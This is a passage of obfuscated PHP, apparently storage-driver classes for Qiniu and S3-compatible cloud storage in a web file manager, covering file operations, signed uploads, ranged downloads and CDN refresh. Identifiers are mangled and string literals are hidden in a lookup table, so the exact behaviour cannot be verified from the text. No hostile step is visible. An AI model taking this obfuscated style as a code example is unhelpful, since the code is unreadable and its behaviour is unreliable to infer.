new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($“ÇßÓ’ì, $¥©ÃÅ…» = '', $™‘¹åá† = REPEAT_RENAME) { if ($this->setContent($“ÇßÓ’ì, $¥©ÃÅ…»)) { return $this->getPathOuter($“ÇßÓ’ì); } return !1; } public function mkdir($â™çôë, $õÁ®Ö« = REPEAT_SKIP) { $³¥„Ì…œ =& $_SERVER[ç¦¬”œš]; $œ÷øøŸ’ = trim($â™çôë, $³¥„Ì…œ[8]); if ($this->_isFolder($œ÷øøŸ’)) { return $this->getPathOuter($œ÷øøŸ’); } $â™çôë = $œ÷øøŸ’ . $³¥„Ì…œ[8]; $•é·Å¤ = get_path_this($œ÷øøŸ’); $Àù¶Í×– = $â™çôë . $•é·Å¤; if (!$this->mkfile($Àù¶Í×–)) { return !1; } if (!$this->moveFile($Àù¶Í×–, $â™çôë)) { $this->delFile($Àù¶Í×–); return !1; } return $this->getPathOuter($œ÷øøŸ’); } public function copyFile($æ¾»Ûçù, $ßâ…¡ßª) { $„¼İ´™Â = $this->bucketManager->copy($this->bucket, $æ¾»Ûçù, $this->bucket, $ßâ…¡ßª, !0); return $„¼İ´™Â ? !1 : $this->getPathOuter($ßâ…¡ßª); } public function moveFile($¾Ÿ™š½­, $ï ûåö) { $ ´¥ş“î = $this->bucketManager->move($this->bucket, $¾Ÿ™š½­, $this->bucket, $ï ûåö, !0); return $ ´¥ş“î ? !1 : $this->getPathOuter($ï ûåö); } public function delFile($èÚíú˜ğ) { if (!$this->exist($èÚíú˜ğ)) { return !0; } $¡áºñ‡œ = $this->bucketManager->delete($this->bucket, $èÚíú˜ğ); return $¡áºñ‡œ ? !1 : !0; } public function delFolder($Á¡“â³Á) { $¨ÈÙ×¦Û =& $_SERVER[ç¦¬”œš]; if (!$this->exist($Á¡“â³Á)) { return !0; } $this->listItemCache = !1; $í¼ø¯Ğ = $this->fileList($Á¡“â³Á); $this->listItemCache = !0; $µúöÎªÑ = trim($Á¡“â³Á, $¨ÈÙ×¦Û[8]) . $¨ÈÙ×¦Û[8]; if (!empty($Á¡“â³Á) && $Á¡“â³Á !== $¨ÈÙ×¦Û[228] && !in_array($µúöÎªÑ, $í¼ø¯Ğ[$¨ÈÙ×¦Û[85]])) { $í¼ø¯Ğ[$¨ÈÙ×¦Û[85]][] = $µúöÎªÑ; } $¼¡ÎÇØ– = $this->delByBatch($í¼ø¯Ğ[$¨ÈÙ×¦Û[86]]); if (!$¼¡ÎÇØ–) { return !1; } $¼¡ÎÇØ– = $this->delByBatch($í¼ø¯Ğ[$¨ÈÙ×¦Û[85]]); if (!$¼¡ÎÇØ–) { return !1; } return $this->delFile($µúöÎªÑ); } private function delByBatch($Ì³œú™Ø) { foreach (array_chunk($Ì³œú™Ø, 1000) as $’şˆœŒ) { $‹‹Êì‡û = $this->bucketManager->buildBatchDelete($this->bucket, $’şˆœŒ); list($¨ùï©æ, $êãß¼¥) = $this->bucketManager->batch($‹‹Êì‡û); if ($êãß¼¥) { return !1; } } return !0; } public function rename($±İø²÷, $±üõÑ–ï) { return $this->renameObject($±İø²÷, $±üõÑ–ï); } public function fileInfo($åÈ˜Ó¶¦, $µÀµ¾ÌË = false, $Ø¦À¼áÍ = array()) { $õĞÛÔÛ‡ =& $_SERVER[ç¦¬”œš]; $§¥Å—™ = array($õĞÛÔÛ‡[32] => $this->pathThis($åÈ˜Ó¶¦), $õĞÛÔÛ‡[87] => $this->getPathOuter($õĞÛÔÛ‡[8] . $åÈ˜Ó¶¦), $õĞÛÔÛ‡[33] => $õĞÛÔÛ‡[230], $õĞÛÔÛ‡[79] => isset($Ø¦À¼áÍ[$õĞÛÔÛ‡[1530]]) ? $Ø¦À¼áÍ[$õĞÛÔÛ‡[1530]] : 0, $õĞÛÔÛ‡[169] => $this->ext($åÈ˜Ó¶¦)); if ($µÀµ¾ÌË) { return $§¥Å—™; } $§¥Å—™[$õĞÛÔÛ‡[231]] = $§¥Å—™[$õĞÛÔÛ‡[88]] = 0; $§¥Å—™[$õĞÛÔÛ‡[232]] = $§¥Å—™[$õĞÛÔÛ‡[233]] = !0; if (empty($Ø¦À¼áÍ)) { $Ø¦À¼áÍ = $this->objectMeta($åÈ˜Ó¶¦); if (!$Ø¦À¼áÍ) { return $§¥Å—™; } } if (isset($Ø¦À¼áÍ[$õĞÛÔÛ‡[234]]) && $Ø¦À¼áÍ[$õĞÛÔÛ‡[234]]) { $§¥Å—™[$õĞÛÔÛ‡[235]] = $Ø¦À¼áÍ[$õĞÛÔÛ‡[234]]; } if (isset($Ø¦À¼áÍ[$õĞÛÔÛ‡[245]]) && $Ø¦À¼áÍ[$õĞÛÔÛ‡[245]]) { $§¥Å—™[$õĞÛÔÛ‡[235]] = $Ø¦À¼áÍ[$õĞÛÔÛ‡[245]]; } if (isset($Ø¦À¼áÍ[$õĞÛÔÛ‡[1531]])) { $§¥Å—™[$õĞÛÔÛ‡[88]] = substr($Ø¦À¼áÍ[$õĞÛÔÛ‡[1531]] . $õĞÛÔÛ‡[12], 0, 10); } if (isset($Ø¦À¼áÍ[$õĞÛÔÛ‡[1530]])) { $§¥Å—™[$õĞÛÔÛ‡[79]] = $Ø¦À¼áÍ[$õĞÛÔÛ‡[1530]]; } return $§¥Å—™; } public function folderInfo($‡Œ¢³¶, $›Åœ½‚ã = false) { $ÛÆ§Âéá =& $_SERVER[ç¦¬”œš]; $ˆ¹©¸ = array($ÛÆ§Âéá[32] => $this->pathThis($‡Œ¢³¶), $ÛÆ§Âéá[87] => $this->getPathOuter($ÛÆ§Âéá[8] . $‡Œ¢³¶), $ÛÆ§Âéá[33] => $ÛÆ§Âéá[78]); if ($›Åœ½‚ã) { return $ˆ¹©¸; } $ˆ¹©¸[$ÛÆ§Âéá[231]] = $ˆ¹©¸[$ÛÆ§Âéá[88]] = 0; $ˆ¹©¸[$ÛÆ§Âéá[232]] = $ˆ¹©¸[$ÛÆ§Âéá[233]] = !0; $‡Œ¢³¶ = rtrim($‡Œ¢³¶, $ÛÆ§Âéá[8]) . $ÛÆ§Âéá[8]; $¶é†¯ø = $this->objectMeta($‡Œ¢³¶); if (isset($¶é†¯ø[$ÛÆ§Âéá[1531]])) { $ˆ¹©¸[$ÛÆ§Âéá[88]] = substr($¶é†¯ø[$ÛÆ§Âéá[1531]] . $ÛÆ§Âéá[12], 0, 10); } return $ˆ¹©¸; } public function listPath($êÛÜµÆ¡, $°ÛÛ µ¢ = false) { $¡¬ÉÂ« =& $_SERVER[ç¦¬”œš]; $Ş‹ê«¡ = $this->fileList($êÛÜµÆ¡, $¡¬ÉÂ«[8], !0); foreach ($Ş‹ê«¡[$¡¬ÉÂ«[85]] as $úİ»ñø´ => $û„ÇÆğĞ) { $Ş‹ê«¡[$¡¬ÉÂ«[85]][$úİ»ñø´] = $this->folderInfo($û„ÇÆğĞ, $°ÛÛ µ¢); } foreach ($Ş‹ê«¡[$¡¬ÉÂ«[86]] as $úİ»ñø´ => $û„ÇÆğĞ) { $Ş‹ê«¡[$¡¬ÉÂ«[86]][$úİ»ñø´] = $this->fileInfo($û„ÇÆğĞ[$¡¬ÉÂ«[97]], $°ÛÛ µ¢, $û„ÇÆğĞ); } return $Ş‹ê«¡; } public function has($ñçù«Ëğ, $àÀüÔº£ = false, $Œ¶Î˜¸Ø = true) { $·¹¤Œ³ =& $_SERVER[ç¦¬”œš]; $ñçù«Ëğ = trim($ñçù«Ëğ, $·¹¤Œ³[8]); $×‹í±ù = empty($ñçù«Ëğ) && $ñçù«Ëğ !== $·¹¤Œ³[228] ? $·¹¤Œ³[12] : $ñçù«Ëğ . $·¹¤Œ³[8]; $¾˜œ´´¤ = $·¹¤Œ³[12]; $Óï–âÛ¿ = 500; $í¸™Åèƒ = $·¹¤Œ³[8]; $¶éşøŸ = $œàãİ¿¦ = 0; while (!0) { check_abort(); list($‡“›æ®î, $©é²«Ìš) = $this->bucketManager->listFiles($this->bucket, $×‹í±ù, $¾˜œ´´¤, $Óï–âÛ¿, $í¸™Åèƒ); if ($©é²«Ìš) { break; } $¾˜œ´´¤ = array_key_exists($·¹¤Œ³[1476], $‡“›æ®î) ? $¾˜œ´´¤ = $‡“›æ®î[$·¹¤Œ³[1532]] : $·¹¤Œ³[12]; if ($àÀüÔº£) { if (!empty($‡“›æ®î[$·¹¤Œ³[1533]])) { $¶éşøŸ += count($‡“›æ®î[$·¹¤Œ³[1533]]); } if (!empty($‡“›æ®î[$·¹¤Œ³[1534]])) { $œàãİ¿¦ += count($‡“›æ®î[$·¹¤Œ³[1534]]); } if ($¾˜œ´´¤ === $·¹¤Œ³[12]) { break; } continue; } if ($Œ¶Î˜¸Ø) { if (!empty($‡“›æ®î[$·¹¤Œ³[1533]])) { return !0; } } else { if (!empty($‡“›æ®î[$·¹¤Œ³[1534]])) { return !0; } } if ($¾˜œ´´¤ === $·¹¤Œ³[12]) { break; } } if ($àÀüÔº£) { return array($·¹¤Œ³[239] => $¶éşøŸ, $·¹¤Œ³[240] => $œàãİ¿¦); } return !1; } public function listAll($»œ¯Íõ–) { $İß—Şâ‚ =& $_SERVER[ç¦¬”œš]; $Úœìéäô = $this->fileList($»œ¯Íõ–, $İß—Şâ‚[12], !0); $şïœÛëÔ = array_to_keyvalue($Úœìéäô[$İß—Şâ‚[86]], $İß—Şâ‚[32]); foreach ($Úœìéäô[$İß—Şâ‚[85]] as $‰Üğôµ) { if (is_string($‰Üğôµ)) { $şïœÛëÔ[$‰Üğôµ] = array($İß—Şâ‚[79] => 0); } } return $this->listAllFiles($»œ¯Íõ–, $şïœÛëÔ); } private function fileList($á¢ë¤§«, $”¾Ø¡Õô = '', $›â«†îÔ = 0) { $¸¡æ‹îæ =& $_SERVER[ç¦¬”œš]; $á¢ë¤§« = trim($á¢ë¤§«, $¸¡æ‹îæ[8]); $Ğí¶”Õ = empty($á¢ë¤§«) && $á¢ë¤§« !== $¸¡æ‹îæ[228] ? $¸¡æ‹îæ[12] : $á¢ë¤§« . $¸¡æ‹îæ[8]; $…™˜¤Øı = $¸¡æ‹îæ[12]; $¾´å = 1000; $•˜ŒŠùø = $ÄŸû—­Œ = array(); while (!0) { check_abort(); list($µ‚ÀêÙ, $¼§ØÀ¶ä) = $this->bucketManager->listFiles($this->bucket, $Ğí¶”Õ, $…™˜¤Øı, $¾´å, $”¾Ø¡Õô); if ($¼§ØÀ¶ä) { break; } $…™˜¤Øı = array_key_exists($¸¡æ‹îæ[1476], $µ‚ÀêÙ) ? $…™˜¤Øı = $µ‚ÀêÙ[$¸¡æ‹îæ[1532]] : $¸¡æ‹îæ[12]; $Ø¸üğÆ = isset($µ‚ÀêÙ[$¸¡æ‹îæ[1533]]) ? $µ‚ÀêÙ[$¸¡æ‹îæ[1533]] : array(); $¢‰ê¤âï = isset($µ‚ÀêÙ[$¸¡æ‹îæ[1534]]) ? $µ‚ÀêÙ[$¸¡æ‹îæ[1534]] : array(); foreach ($Ø¸üğÆ as $ã°¾Ëş°) { if ($ã°¾Ëş°[$¸¡æ‹îæ[97]] == $Ğí¶”Õ) { continue; } $·ÕØ¤é¥ = $ã°¾Ëş°[$¸¡æ‹îæ[97]]; $ƒ¼©œı = $ã°¾Ëş°[$¸¡æ‹îæ[1530]]; $ã°¾Ëş°[$¸¡æ‹îæ[79]] = $ƒ¼©œı; $›Õà‹À = $ƒ¼©œı == 0 && substr($·ÕØ¤é¥, strlen($·ÕØ¤é¥) - 1, 1) == $¸¡æ‹îæ[8] ? !0 : !1; $this->cacheMethodInfoSet($·ÕØ¤é¥, $›Õà‹À, $ã°¾Ëş°); if ($›Õà‹À) { $•˜ŒŠùø[] = $·ÕØ¤é¥; continue; } $ÄŸû—­Œ[] = $›â«†îÔ ? $ã°¾Ëş° : $·ÕØ¤é¥; } foreach ($¢‰ê¤âï as $·ÕØ¤é¥) { if ($·ÕØ¤é¥ == $Ğí¶”Õ) { continue; } $•˜ŒŠùø[] = $·ÕØ¤é¥; $this->cacheMethodInfoSet($·ÕØ¤é¥, !0); } if ($…™˜¤Øı === $¸¡æ‹îæ[12]) { break; } } $this->cacheMethodInfoSet($á¢ë¤§«, !0); return array($¸¡æ‹îæ[85] => $•˜ŒŠùø, $¸¡æ‹îæ[86] => $ÄŸû—­Œ); } public function canRead($Ñ×»Ğˆà) { return $this->exist($Ñ×»Ğˆà) ? !0 : !1; } public function canWrite($»½€˜Â) { return $this->exist($»½€˜Â) ? !0 : !1; } public function getContent($„ş¬ÜóŒ) { return $this->fileSubstr($„ş¬ÜóŒ, 0, -1); } public function setContent($•ĞÜõ”», $ì–»ÇÂû = '') { $İõç¹®² = $this->tempFile($this->pathThis($•ĞÜõ”»)); file_put_contents($İõç¹®², $ì–»ÇÂû); if ($this->upload($•ĞÜõ”», $İõç¹®²)) { $this->tempFileRemve($İõç¹®²); return !0; } return !1; } public function refreshUrls($Ø‚ŞŞòù) { $ªÚæÙ×² =& $_SERVER[ç¦¬”œš]; $ÂÑÅ¡ëî = array(); if (is_array($Ø‚ŞŞòù)) { foreach ($Ø‚ŞŞòù as $´œêÇ¸ß) { $ÂÑÅ¡ëî[] = $this->link($´œêÇ¸ß); } } else { $ÂÑÅ¡ëî[] = $this->link($Ø‚ŞŞòù); } $ß¶¨øÀ = new Qiniu\Cdn\CdnManager($this->auth); list($Ğşë¯†é, $ëÎ¹«¡×) = $ß¶¨øÀ->refreshUrls($ÂÑÅ¡ëî); if ($ëÎ¹«¡×) { return !1; } return $Ğşë¯†é[$ªÚæÙ×²[1265]] == $ªÚæÙ×²[839] ? !0 : !1; } public function fileSubstr($äÛ½Œ, $¤İÕ‰˜, $±š‚˜©Ö) { $µ‡Š¼Ì =& $_SERVER[ç¦¬”œš]; if (!($úàÆÂì¦ = $this->link($äÛ½Œ))) { return !1; } $‰Šä­€ = !1; if ($±š‚˜©Ö > 0) { $áå–ãÕÀ = $¤İÕ‰˜ + $±š‚˜©Ö - 1; $‰Šä­€ = array($µ‡Š¼Ì[1535] . $¤İÕ‰˜ . $µ‡Š¼Ì[462] . $áå–ãÕÀ); } $şĞÏÏ…± = url_request($úàÆÂì¦, $µ‡Š¼Ì[261], !1, $‰Šä­€); return $şĞÏÏ…±[$µ‡Š¼Ì[830]] ? $şĞÏÏ…±[$µ‡Š¼Ì[1288]] : !1; } public function upload($î¡ùˆ±§, $«Û°·Ÿø, $¶õÌô× = false, $Ò ‚¹« = REPEAT_REPLACE) { $¬‰€¸Èê = new Qiniu\Storage\UploadManager(); $â ’Öı = $this->auth->uploadToken($this->bucket, $î¡ùˆ±§); $ÓÉ–ïë = get_file_mime(get_path_ext($«Û°·Ÿø)); list($ü›Ìê¢ş, $ö£„¹×Ê) = $¬‰€¸Èê->putFile($â ’Öı, $î¡ùˆ±§, $«Û°·Ÿø, null, $ÓÉ–ïë); return $ö£„¹×Ê ? !1 : $this->getPathOuter($î¡ùˆ±§); } public function uploadFormData($®õ³ßÙ, $†Ç€öÃ¿ = 3600) { return $this->uploadToken($®õ³ßÙ, $†Ç€öÃ¿); } public function multiUploadFormData($ÈÊÒØ¤Ú, $ÁÅ¨·‡ë = 3600) { return $this->uploadToken($ÈÊÒØ¤Ú, $ÁÅ¨·‡ë); } private function uploadToken($»ûá¥áú, $öªß‹Şµ = 3600) { $½€€¶©Œ =& $_SERVER[ç¦¬”œš]; $¬Ì­Íî© = $öªß‹Şµ; $®Ó§Ğ™† = array($½€€¶©Œ[1536] => $½€€¶©Œ[1537]); $ô¢¹Ïç™ = $»ûá¥áú; $¡¿ğæ¡ = $this->auth->uploadToken($this->bucket, $ô¢¹Ïç™, $¬Ì­Íî©, $®Ó§Ğ™†, !0); $ÓÜò…ÇŸ = empty($this->region) || $this->region == $½€€¶©Œ[1538] ? $½€€¶©Œ[12] : $½€€¶©Œ[462] . $this->region; $ »“«İì = http_type() . "\x3a\x2f\x2f\165\x70\154\157\x61\x64{$ÓÜò…ÇŸ}\56\161\x69\x6e\x69\x75\x70\56\x63\x6f\155\x2f"; return array($½€€¶©Œ[1539] => $¡¿ğæ¡, $½€€¶©Œ[1540] => $ »“«İì); } public function download($Úıàå÷İ, $ÃÄâ’ÂŸ) { $¾Ã„õÁæ = IO::getPathInner(IO::mkfile($ÃÄâ’ÂŸ)); if (!($€ºÄü×— = $this->link($Úıàå÷İ))) { return !1; } $áÑÛùŒê = 0; $”ú´–‰Ş = 1024 * 200; $œ—ÊŞãÖ = fopen($¾Ã„õÁæ, $_SERVER[ç¦¬”œš][1541]); while (!0) { $ĞˆŠëöÔ = $this->fileSubstr($Úıàå÷İ, $áÑÛùŒê, $”ú´–‰Ş); if ($ĞˆŠëöÔ === !1) { return !1; } fwrite($œ—ÊŞãÖ, $ĞˆŠëöÔ); $áÑÛùŒê += $”ú´–‰Ş; if (strlen($ĞˆŠëöÔ) < $”ú´–‰Ş) { break; } } fclose($œ—ÊŞãÖ); return $ÃÄâ’ÂŸ; } public function link($ôË¿¶Áé, $ÑÕ¸¾ˆ = '') { if (!$this->isFile($ôË¿¶Áé)) { return !1; } $£üËçåù = $this->getHost() . $_SERVER[ç¦¬”œš][8] . $this->pathEncode($ôË¿¶Áé) . $ÑÕ¸¾ˆ; return $this->auth->privateDownloadUrl($£üËçåù, 3600 * 12); } public function fileOut($èŒ¢ı‚, $íŞÌÃıà = false, $ş„²öÇí = false, $Æ¦óôèü = '') { $ÌÙÌÅ¥¡ =& $_SERVER[ç¦¬”œš]; if ($this->isFileOutServer()) { return $this->fileOutServer($èŒ¢ı‚, $íŞÌÃıà, $ş„²öÇí, $Æ¦óôèü); } if (!$ş„²öÇí) { $ş„²öÇí = $this->pathThis($èŒ¢ı‚); } $¿‚éÓáŸ = $íŞÌÃıà ? $ÌÙÌÅ¥¡[1542] . rawurlencode($ş„²öÇí) : $ÌÙÌÅ¥¡[12]; $İªÑà¢ = $this->link($èŒ¢ı‚, $¿‚éÓáŸ); $this->fileOutLink($İªÑà¢); } public function fileOutServer($åÒÛ›äï, $éìŞø® = false, $ÖÎ‹ÑÔô = false, $ìáö˜ó­ = '') { parent::fileOut($åÒÛ›äï, $éìŞø®, $ÖÎ‹ÑÔô, $ìáö˜ó­); } public function fileOutImage($ŞËÁ·ùş, $™Ïı˜•’ = 250) { if ($this->size($ŞËÁ·ùş) > 1024 * 1024 * 20) { return $this->fileOutImageServer($ŞËÁ·ùş, $™Ïı˜•’); } $Ò˜Íœä = $this->link($ŞËÁ·ùş, $_SERVER[ç¦¬”œš][1543] . $™Ïı˜•’); $this->fileOutLink($Ò˜Íœä); } public function fileOutImageServer($„†‘À”•, $ß±ŠÛĞí = 250) { parent::fileOutImage($„†‘À”•, $ß±ŠÛĞí); } public function hashMd5($½‘öÀ­) { $îìÎ¸« =& $_SERVER[ç¦¬”œš]; $ì‰Ú¯Ä = $this->objectMeta($½‘öÀ­); return isset($ì‰Ú¯Ä[$îìÎ¸«[245]]) ? $ì‰Ú¯Ä[$îìÎ¸«[245]] : !1; $ÂÁñöˆ = $this->link($½‘öÀ­, $îìÎ¸«[1544]); } public function size($å©ä¸¿Û) { $™ßôãÒ¾ = $this->objectMeta($å©ä¸¿Û); return $™ßôãÒ¾ ? $™ßôãÒ¾[$_SERVER[ç¦¬”œš][79]] : 0; } public function info($¢®«éğ½) { if ($this->isFolder($¢®«éğ½)) { return $this->folderInfo($¢®«éğ½); } else { if ($this->isFile($¢®«éğ½)) { return $this->fileInfo($¢®«éğ½); } } return !1; } public function exist($æ¸¼úÀ) { return $this->isFile($æ¸¼úÀ) || $this->isFolder($æ¸¼úÀ); } public function isFile($Í¨ªÀÂµ) { return !$this->isFolder($Í¨ªÀÂµ) && $this->objectMeta($Í¨ªÀÂµ); } public function isFolder($ŠóìÎŸ) { return $this->cacheMethod($_SERVER[ç¦¬”œš][179], $ŠóìÎŸ); } protected function objectMeta($Ñ¼ í) { return $this->cacheMethod($_SERVER[ç¦¬”œš][181], $Ñ¼ í); } protected function _objectMeta($ƒ«Äıã) { $©ã„Á’ =& $_SERVER[ç¦¬”œš]; list($ªî¼üØÂ, $ğ÷çÓ¨) = $this->bucketManager->stat($this->bucket, $ƒ«Äıã); if ($ªî¼üØÂ) { $ªî¼üØÂ[$©ã„Á’[79]] = intval($ªî¼üØÂ[$©ã„Á’[1530]]); } return $ªî¼üØÂ; } protected function _isFolder($ÔûêÅ·) { $­µâ¦·¶ =& $_SERVER[ç¦¬”œš]; if ($ÔûêÅ· == $­µâ¦·¶[12] || $ÔûêÅ· == $­µâ¦·¶[8]) { return !0; } list($¤£¥¯¡û, $Ü¢©îš) = $this->bucketManager->listFiles($this->bucket, trim($ÔûêÅ·, $­µâ¦·¶[8]) . $­µâ¦·¶[8], $­µâ¦·¶[12], 1, $­µâ¦·¶[8]); return !empty($¤£¥¯¡û[$­µâ¦·¶[1533]]) || !empty($¤£¥¯¡û[$­µâ¦·¶[1534]]) ? !0 : !1; } } goto eë˜ò”‚À¤; a®Ï´‹ˆ™¬: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($™Ü¶£ƒæ) { parent::__construct($™Ü¶£ƒæ); } public function uploadFormData($ßìßü, $Çõšñ¥² = 3600) { $ä´é†æç =& $_SERVER[ç¦¬”œš]; $”ÑÀµı = $ä´é†æç[229]; $³ä‰Ÿ¸ = $ä´é†æç[270]; $ìï¦¼£Ã = $ä´é†æç[62]; $—Š“ØøŒ = gmdate($ä´é†æç[271]); $—°şÀÖÂ = gmdate($ä´é†æç[272]); $¿„Ó ‡È = $ä´é†æç[273]; $©ê‰œæÇ = $Çõšñ¥² . $ä´é†æç[12]; $©Ï¾©»å = $ä´é†æç[274]; $Æà…¿÷ü = array($this->accessKey, $—°şÀÖÂ, $this->region, $ìï¦¼£Ã, $¿„Ó ‡È); $ˆ«ï€æ‚ = implode($ä´é†æç[8], $Æà…¿÷ü); $Öƒİ­Íƒ = array($ä´é†æç[275] => gmdate($ä´é†æç[299], strtotime($ä´é†æç[277])), $ä´é†æç[278] => array(array($ä´é†æç[279] => $this->bucket), array($ä´é†æç[280] => $”ÑÀµı), array($ä´é†æç[281], $ä´é†æç[282], $ä´é†æç[12]), array($ä´é†æç[281], $ä´é†æç[283], $ä´é†æç[12]), array($ä´é†æç[281], $ä´é†æç[284], $ä´é†æç[12]), array($ä´é†æç[285] => $©Ï¾©»å), array($ä´é†æç[286] => $ˆ«ï€æ‚), array($ä´é†æç[287] => $³ä‰Ÿ¸), array($ä´é†æç[288] => $—Š“ØøŒ), array($ä´é†æç[289] => $©ê‰œæÇ))); $ıÀ´¼Ç = base64_encode(json_encode($Öƒİ­Íƒ)); $™—Ø´‹© = hash_hmac($ä´é†æç[290], $—°şÀÖÂ, $ä´é†æç[291] . $this->secret, !0); $ƒŠ‰ã = hash_hmac($ä´é†æç[290], $this->region, $™—Ø´‹©, !0); $à‹¹•± = hash_hmac($ä´é†æç[290], $ìï¦¼£Ã, $ƒŠ‰ã, !0); $ä„ê‰»œ = hash_hmac($ä´é†æç[290], $¿„Ó ‡È, $à‹¹•±, !0); $Ş•×©èƒ = hash_hmac($ä´é†æç[290], $ıÀ´¼Ç, $ä„ê‰»œ); $ô“‡ş™… = array($ä´é†æç[246] => $ä´é†æç[12], $ä´é†æç[292] => $ä´é†æç[12], $ä´é†æç[280] => $”ÑÀµı, $ä´é†æç[285] => $©Ï¾©»å, $ä´é†æç[293] => $ıÀ´¼Ç, $ä´é†æç[294] => $ˆ«ï€æ‚, $ä´é†æç[295] => $³ä‰Ÿ¸, $ä´é†æç[296] => $—Š“ØøŒ, $ä´é†æç[297] => $©ê‰œæÇ, $ä´é†æç[298] => $Ş•×©èƒ, $ä´é†æç[208] => $this->getHost()); return $ô“‡ş™…; } public function multiUploadFormData($·ö¿¨‹â, $Ø¥ÒÌ½½ = 3600) { $«“› =& $_SERVER[ç¦¬”œš]; $¡üÍ¾¶Ó = gmdate($«“›[300]); $äãôš = array(); $›ÚÕœ‹‰ = $this->client->getUploadId($this->bucket, $·ö¿¨‹â, $äãôš); if (!$›ÚÕœ‹‰) { return !1; } return array($«“›[254] => $›ÚÕœ‹‰, $«“›[208] => $this->getHost() . $«“›[8] . $this->pathEncode($·ö¿¨‹â), $«“›[255] => $¡üÍ¾¶Ó, $«“›[97] => $·ö¿¨‹â); } public function multiUploadAuthData($¯…—¨‡, $Ûµ½èî = array()) { $ïÅìŞ =& $_SERVER[ç¦¬”œš]; $ïÇò¾Üù = isset($Ûµ½èî[$ïÅìŞ[169]]) ? $Ûµ½èî[$ïÅìŞ[169]] : $ïÅìŞ[12]; $²·ßÕñâ = $Ûµ½èî[$ïÅìŞ[97]]; unset($Ûµ½èî[$ïÅìŞ[97]]); if (isset($Ûµ½èî[$ïÅìŞ[256]])) { return $this->listUploadParts($²·ßÕñâ, $Ûµ½èî); } $æÌìŸû« = array(); if (isset($Ûµ½èî[$ïÅìŞ[301]])) { $æÌìŸû«[$ïÅìŞ[302]] = $Ûµ½èî[$ïÅìŞ[301]]; } $¿÷ãÛÆ‚ = explode($ïÅìŞ[210], $this->getHost()); $¸ÓÍ´Á = array($ïÅìŞ[303] => $¿÷ãÛÆ‚[1], $ïÅìŞ[304] => $ïÅìŞ[12], $ïÅìŞ[246] => $ïÅìŞ[123], $ïÅìŞ[292] => $Ûµ½èî[$ïÅìŞ[79]]); $ğ½‡¨ã„ = $ïÅìŞ[259]; $à­´°ê = $ïÅìŞ[8] . $this->pathEncode($²·ßÕñâ) . $ïÇò¾Üù; $û×‚çó = $this->client->__getSignatureV4($æÌìŸû«, $¸ÓÍ´Á, $ğ½‡¨ã„, $à­´°ê); if (strpos($ïÇò¾Üù, $ïÅìŞ[258]) === 0) { if (isset($æÌìŸû«[$ïÅìŞ[302]])) { $±É¿İ¼· = $æÌìŸû«[$ïÅìŞ[302]]; } else { if (isset($û×‚çó[$ïÅìŞ[302]])) { $±É¿İ¼· = $û×‚çó[$ïÅìŞ[302]]; } else { $±É¿İ¼· = hash($ïÅìŞ[290], $ïÅìŞ[12]); } } return array($ïÅìŞ[265] => $û×‚çó[$ïÅìŞ[265]], $ïÅìŞ[302] => $±É¿İ¼·, $ïÅìŞ[255] => $û×‚çó[$ïÅìŞ[305]]); } return $û×‚çó[$ïÅìŞ[265]]; } public function listUploadParts($İƒ¾Ğú, $‡æ€ã§³ = array()) { $Â‚Ã­ø— =& $_SERVER[ç¦¬”œš]; $‡î±û±Ô = str_replace($Â‚Ã­ø—[266], $Â‚Ã­ø—[12], $‡æ€ã§³[$Â‚Ã­ø—[169]]); $¥ä¦¬Û´ = $this->client->listParts($this->bucket, $İƒ¾Ğú, $‡î±û±Ô); if (!$¥ä¦¬Û´) { return !1; } $®‹Ïéâ = $Â‚Ã­ø—[306]; foreach ($¥ä¦¬Û´ as $Œ¥Ôç±Œ) { $®‹Ïéâ .= $Â‚Ã­ø—[307] . "\x3c\120\141\162\164\x4e\x75\155\x62\145\x72\x3e{$Œ¥Ôç±Œ[$Â‚Ã­ø—[308]]}\74\57\x50\141\162\x74\x4e\165\155\142\x65\162\76\12" . "\74\x45\124\141\x67\76{$Œ¥Ôç±Œ[$Â‚Ã­ø—[309]]}\x3c\x2f\x45\124\141\147\76\12" . $Â‚Ã­ø—[310]; } $®‹Ïéâ .= $Â‚Ã­ø—[311]; $¤œ•òª£ = array(); $‰³ÆİÍÜ = explode($Â‚Ã­ø—[210], $this->getHost()); $¹İŠ‚‘ = array($Â‚Ã­ø—[303] => $‰³ÆİÍÜ[1], $Â‚Ã­ø—[246] => $Â‚Ã­ø—[123], $Â‚Ã­ø—[292] => strlen($®‹Ïéâ)); $­ ƒŒÍ¨ = $Â‚Ã­ø—[257]; $‚—¤ÜÛ¡ = $Â‚Ã­ø—[8] . $this->pathEncode($İƒ¾Ğú) . $‡æ€ã§³[$Â‚Ã­ø—[169]]; $ä¸åÃÖª = $this->client->__getSignatureV4($¤œ•òª£, $¹İŠ‚‘, $­ ƒŒÍ¨, $‚—¤ÜÛ¡, $®‹Ïéâ); return array($Â‚Ã­ø—[265] => $ä¸åÃÖª[$Â‚Ã­ø—[265]], $Â‚Ã­ø—[255] => $ä¸åÃÖª[$Â‚Ã­ø—[305]], $Â‚Ã­ø—[267] => $¥ä¦¬Û´, $Â‚Ã­ø—[302] => $ä¸åÃÖª[$Â‚Ã­ø—[302]]); } public function link($ƒàİ»·¡, $ÛÛƒì²ê = array()) { return parent::link($ƒàİ»·¡, $ÛÛƒì²ê); } public function fileOut($·îà›£õ, $â×İ´€ = false, $¤’ïğˆë = false, $»¬¨ùÄ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[ç¦¬”œš][312])) { return parent::fileOutServer($·îà›£õ, $â×İ´€, $¤’ïğˆë, $»¬¨ùÄ); } parent::fileOut($·îà›£õ, $â×İ´€, $¤’ïğˆë, $»¬¨ùÄ); } public function fileOutImage($ıÏÙ›˜™, $ÆÖÔÉëÌ = 250) { if (strstr($this->endpoint, $_SERVER[ç¦¬”œš][312])) { return parent::fileOutImageServer($ıÏÙ›˜™, $ÆÖÔÉëÌ); } parent::fileOutImage($ıÏÙ›˜™, $ÆÖÔÉëÌ); } public function fileOutLink($º¾¸çÉ) { $øØŸÊáŒ =& $_SERVER[ç¦¬”œš]; if (substr($º¾¸çÉ, 0, 7) == $øØŸÊáŒ[313]) { $º¾¸çÉ = $øØŸÊáŒ[314] . substr($º¾¸çÉ, 7); } header($øØŸÊáŒ[175] . $º¾¸çÉ); die; } } define($_SERVER[ç¦¬”œš][315], 1); define($_SERVER[ç¦¬”œš][316], 2); 